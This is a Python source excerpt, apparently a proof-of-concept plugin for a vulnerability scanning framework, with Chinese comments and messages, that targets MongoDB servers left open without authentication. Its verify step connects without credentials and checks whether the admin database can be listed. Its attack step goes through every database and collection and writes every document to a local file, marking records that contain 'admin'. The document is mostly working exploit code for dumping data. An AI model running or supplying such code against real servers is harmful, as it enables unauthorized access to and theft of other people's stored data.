...
class POC(PocBase):
    ...
    pocDesc = "pocs/MongoDB/mongodb_poc.py"
    output = Output()
    ...
    def _verify(self, url):
        try:
            ...
            my_client = pymongo.MongoClient(url, serverSelectionTimeoutMS=2000, socketTimeoutMS=2000)
            ...
            # 判断是否获取到admin数据库
            if "admin" in db_list:
                self.output.success(f'mongodb_poc:{url} is vulnerable')
                result['target-url'] = url
                result['payload'] = ''
                POC_QUEUE.put(result)
                my_client.close()
            else:
                result = f'mongodb_poc:{url} is not vulnerable'
    ...
    def _attack(self, payload):
        ...
        if is_connected:
            db_list = my_client.list_database_names()
            self.output.success(f'mongodb_poc:目标服务器MongoDB所有数据库{db_list}')
            for db_name in db_list:
                cols = my_client[db_name].list_collection_names()
                self.output.success(f'mongodb_poc:{db_name}数据库里的所有表名为{cols}')
                fo = open("mongodb_result.txt", "a")
                for col in cols:
                    datas = my_client[db_name][col].find()
                    fo.write(f'mongodb_poc:{db_name}库{col}表里的所有数据为:\n')
                    for data in datas:
                        fo.write(f'\t{data}\n')
                        if 'admin' in data.values():
                            self.output.success(f'mongodb_poc:{db_name}库{col}表的数据集里存在admin关键词: {data}')
                    fo.write("\n")
                fo.close()
            result = f'mongodb_poc:{url} 服务器获取数据完成，结果保存在mongodb_result.txt文件中'
        else:
            result = f'mongodb_poc:{url} 服务器获取数据失败'
        result = {'Stdout': result}
        return result
